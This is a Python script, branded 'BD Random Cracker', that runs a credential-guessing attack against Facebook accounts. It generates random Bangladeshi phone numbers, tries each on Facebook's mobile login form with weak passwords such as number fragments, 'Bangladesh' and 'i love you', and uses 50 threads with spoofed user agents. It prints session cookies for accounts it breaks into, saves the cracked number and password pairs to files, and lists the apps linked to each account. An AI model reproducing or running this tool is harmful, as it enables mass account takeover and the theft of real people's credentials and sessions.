#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
R = '\033[1;31m' # PUTIH
G = '\033[1;32m' # PUTIH
H = '\033[1;32m' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
H = '\x1b[1;92m'
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
MXD = '\033[1;92m' #MAHADIGREEN
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By SPY")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for spy in range(9993,176281):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def loading():
                animation = [
                    '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
                    '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
                    '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
                    '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
                    '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
                    '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
                    '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
                    '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
                    '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
                    '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
                for i in range(50):
                    time.sleep(0.1)
                    sys.stdout.write(f'''\r {N}[{H}•{N}] {H}WELCOME TO KHALID'S WORLD...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
                    sys.stdout.flush()
logo=("""\033[132m
\033[1;32m┌─────────────────────────────────────────────────────┐
\033[1;32m│                                                     │
\033[1;32m│  \033[1;32m  ██   ██ \033[1;33m██   ██ \033[1;31m █████  \033[1;34m██	 \033[1;36m    ██ \033[1;35m██████    \033[1;32m    │
\033[1;32m│  \033[1;32m  ██  ██  \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██  \033[1;32m     │
\033[1;32m│  \033[1;32m  █████   \033[1;33m███████ \033[1;31m███████ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██   \033[1;32m    │
\033[1;32m│  \033[1;32m  ██  ██  \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██  \033[1;32m     │
\033[1;32m│  \033[1;32m  ██   ██ \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m███████ \033[1;36m██ \033[1;35m██████   \033[1;32m     │
\033[1;32m│                                                     │
\033[1;32m└─────────────────────────────────────────────────────┘

\033[1;92m┌─────────────────────────────────────────────────────┐
\033[1;92m│      \033[1;91m[\033[1;92m+\033[1;91m]\033[1;92mBANGLADESHI RANDOM ACCOUNT CRACKER\033[1;91m[\033[1;92m+\033[1;91m]       \033[1;92m│
\033[1;92m└─────────────────────────────────────────────────────┘

\033[1;92m┌─────────────────────────────────────────────────────┐
\033[1;92m│[\033[1;91m•\033[1;92m] DEVELOPER  :            KHALID SHAIFULLAH        │
\033[1;92m│[\033[1;91m•\033[1;92m] FACEBOOK   :            KHALID SHAIFULLAH        │
\033[1;92m│[\033[1;91m•\033[1;92m] GITHUB     :            KHALID-404 	      │
\033[1;92m│[\033[1;91m•\033[1;92m] WHATSAPP   :            +8801798396843           │
\033[1;92m│[\033[1;91m•\033[1;92m] TOOLS      :            BD RANDOM CRACKER        │
\033[1;92m└─────────────────────────────────────────────────────┘""")
khld=("""\033[1;32m┌─────────────────────────────────────────────────────┐
\033[1;32m│                                                     │
\033[1;32m│  \033[1;32m  ██   ██ \033[1;33m██   ██ \033[1;31m █████  \033[1;34m██	 \033[1;36m    ██ \033[1;35m██████    \033[1;32m    │
\033[1;32m│  \033[1;32m  ██  ██  \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██  \033[1;32m     │
\033[1;32m│  \033[1;32m  █████   \033[1;33m███████ \033[1;31m███████ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██   \033[1;32m    │
\033[1;32m│  \033[1;32m  ██  ██  \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m██	 \033[1;36m    ██ \033[1;35m██   ██  \033[1;32m     │
\033[1;32m│  \033[1;32m  ██   ██ \033[1;33m██   ██ \033[1;31m██   ██ \033[1;34m███████ \033[1;36m██ \033[1;35m██████   \033[1;32m     │
\033[1;32m│                                                     │
\033[1;32m└─────────────────────────────────────────────────────┘""")
def cek_apk(session,coki):
	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Khalid():
	os.system('clear')
	print(logo)
	print("[1] BD NUMBER ID CLONER CLONER [M1] [ONLY OK]")
	print("[2] BD GAME ID CLONER [M2] [APK] ")
	print("[3] CONTACT ADMIN ")
	print('[0] \033[1;91mEXIT')
	opt = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m \033[1;92mCHOOSE : ')
	if opt =='1':
		os.system("clear")
		loading()
		os.system("xdg-open https://www.facebook.com/groups/termux.working.commands/?ref=share")
		virus2()
	if opt =='2':
		os.system("clear")
		loading()
		os.system("xdg-open https://www.facebook.com/groups/termux.working.commands/?ref=share")
		virus3()
	if opt =='3':
		os.system("xdg-open https://www.facebook.com/KHALID.CYBER.404")
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;92mCHOOSE A VALID OPTION\033[0;97m');time.sleep(1)
		Khalid()
def virus2():
	user=[]
	os.system('clear')
	print(khld)
	print("BD SIM CODES : 016, 017, 018, 019")
	print(54*'_')
	kode = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92mENTER SIM CODE: ')
	os.system("xdg-open https://github.com/KHALID-404")
	vrsn = ' BD NUMBER ID CRACKER [ONLY OK] '
	print(54*'_')
	limit = int(input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92mENTER CRACKING LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  TOTAL ACCOUNTS:\033[1;92m '+tl)
		print(f' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  USARAGENTS : '+str(len(ugen)))
		print(f' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m\033[1;97m  SIM CODE :\033[1;92m {kode} ')
		print(f"\033[1;97m \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  VERSION :\033[1;92m {vrsn}")
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,'Bangladesh']
			yaari.submit(b,uid,pwx,tl)
	print(54*'_')
	print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m CRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m CRACKED ACCOUNTS ARE SAVED IN KHALID.txt')
	print(54*'_')
	exit()
def virus3():
	user=[]
	os.system('clear')
	print(khld)
	print(" BD SIM CODES : 016, 017, 018, 019")
	kode = input(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m ENTER SIM CODE: ')
	os.system("xdg-open https://github.com/KHALID-404")
	vrsn = ' BD NUMBER ID CLONER [APK] '
	limit = int(input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m ENTER CRACKING LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  TOTAL ACCOUNTS:\033[1;92m '+tl)
		print(f' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  USARAGENTS : '+str(len(ugen)))
		print(f' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m\033[1;97m  SIM CODE :\033[1;92m {kode} ')
		print(f"\033[1;97m \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m  VERSION :\033[1;92m {vrsn}")
		print(54*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(c,uid,pwx,tl)
	print(50*'_')
	print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m CRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m CRACKED ACCOUNTS ARE SAVED IN KHALID.txt')
	print(50*'_')
	exit()
def a(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mCLONING\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [KHALID-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
                open('/sdcard/KHALID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\x1b[38;5;196m[KHALID-CP] {uid}|{ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/KHALID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[KHALID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mCLONING\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [KHALID-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [📌] NUMBER : {uid}')
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/KHALID-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
def c(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mCLONING\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [KHALID-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [📌] NUMBER : {uid}')
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/KHALID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
Khalid()
